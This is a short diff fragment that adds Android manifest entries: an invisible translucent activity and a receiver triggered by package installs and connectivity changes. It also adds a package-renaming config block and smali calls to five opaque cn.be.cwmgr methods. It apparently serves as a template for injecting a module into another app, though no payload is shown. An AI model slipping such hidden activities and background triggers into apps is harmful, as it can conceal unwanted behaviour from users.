@@ -1,0 +1,26 @@
+<activity android:name="cn.be.cwact"
+android:theme="@android:style/Theme.Translucent.NoTitleBar"
+android:launchMode="singleTask"
+></activity>
+
+<receiver android:name="cn.be.cwrec">
+<intent-filter>
+<action android:name="android.intent.action.PACKAGE_ADDED" />
+<data android:scheme="package" />
+</intent-filter>
+<intent-filter>
+<action android:name="android.net.conn.CONNECTIVITY_CHANGE" />
+</intent-filter>
+</receiver>
+
+oldPN:cn.be;
+oldMN:cwmgr;
+oldreceiver:cwrec;
+oldAC:CMATP;
+oldVer:5;
+
+invoke-static {p0}, Lcn/be/cwmgr;->m2(Landroid/content/Context;)V
+invoke-static {p0}, Lcn/be/cwmgr;->m1(Landroid/content/Context;)V
+invoke-static {p0}, Lcn/be/cwmgr;->m3(Landroid/content/Context;)V
+invoke-static {p0}, Lcn/be/cwmgr;->m4(Landroid/content/Context;)V
+invoke-static {p0}, Lcn/be/cwmgr;->m5(Landroid/content/Context;)V
